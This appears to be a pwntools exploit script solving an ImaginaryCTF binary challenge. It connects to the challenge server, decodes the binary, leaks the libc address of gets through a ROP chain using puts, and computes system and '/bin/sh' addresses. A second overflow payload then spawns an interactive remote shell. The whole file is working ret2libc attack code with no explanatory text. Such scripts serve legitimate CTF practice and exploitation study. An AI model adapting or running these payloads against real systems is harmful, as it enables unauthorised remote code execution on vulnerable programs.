#!/usr/bin/python3

from pwn import *
import base64

exe = ELF("./chall.elf")

r = remote("chal.imaginaryctf.org", 42020)

r.recvuntil("---------------------------BEGIN  DATA---------------------------")
r.recvline()

binary = r.recvline().strip()

raw = base64.b64decode(binary)

f = open("chall.elf", "wb").write(raw)

offset = u16(raw[0x1149:0x114b])
log.warn("Offset = 0x%x", offset)

ret = 0x00000000004011a9
pop_rdi = 0x000000000040120b

payload = b"M"*(offset + 8)
payload += p64(pop_rdi)
payload += p64(exe.got["gets"])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])

r.sendline(payload)

r.recvuntil("Thanks!")
r.recvline()
gets = u64(r.recv(6).ljust(0x8, p8(0)))
log.warn("gets 0x%x", gets)

system = gets - 0x2c680
binsh = system + 0x13cb59

payload = b"M"*(offset + 8)
payload += p64(pop_rdi)
payload += p64(binsh)
#payload += p64(ret)
payload += p64(system)
r.sendline(payload)

r.interactive()
